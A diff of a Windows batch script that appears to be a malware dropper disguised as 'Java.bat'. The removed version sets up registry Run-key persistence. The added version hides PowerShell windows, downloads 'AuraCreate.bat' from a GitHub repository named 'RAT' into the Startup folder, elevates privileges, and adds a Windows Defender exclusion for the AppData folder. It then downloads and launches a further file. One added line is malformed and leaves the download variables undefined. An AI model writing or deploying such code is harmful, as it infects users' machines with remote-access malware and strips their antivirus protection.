@@ -1,35 +1,16 @@
 @echo off
-:: Check if running from final destination
-set "DEST=%LOCALAPPDATA%\Microsoft\Java\Java.bat"
-set "SELF=%~f0"
-
-:: If already running from destination, skip installation logic
-if /I "%SELF%"=="%DEST%" goto :MAIN
-
-:: Elevate if needed
+set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/AuraCreate.bat"
+set "AURA_BAT_FILE=%STARTUP_FOLDER%\AuraCreate.bat"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
-    powershell -WindowStyle Hidden -Command "Start-Process '%SELF%' -Verb runAs"
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
-
-:: Cleanup old entries
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "i.bat" /f >nul 2>&1
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "i.bat" /f >nul 2>&1
-
-:: Create new folder and copy self
-mkdir "%LOCALAPPDATA%\Microsoft\Java" >nul 2>&1
-copy "%SELF%" "%DEST%" >nul
-
-:: Register as Java.bat
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java.bat" /d "\"%DEST%\"" /f
-
-:: Launch only ONCE
-start "" "%DEST%"
-exit
-
-:MAIN
-:: ✅ Normal logic here — only runs once from correct location
-:: Add your payload logic below
-echo [✓] Java.bat is installed and ready.
+set "APPDATA_PATH=%USERPROFILE%\AppData"
+set "https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Java.bat"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
+start "" "%TARGET_FILE%"
 exit
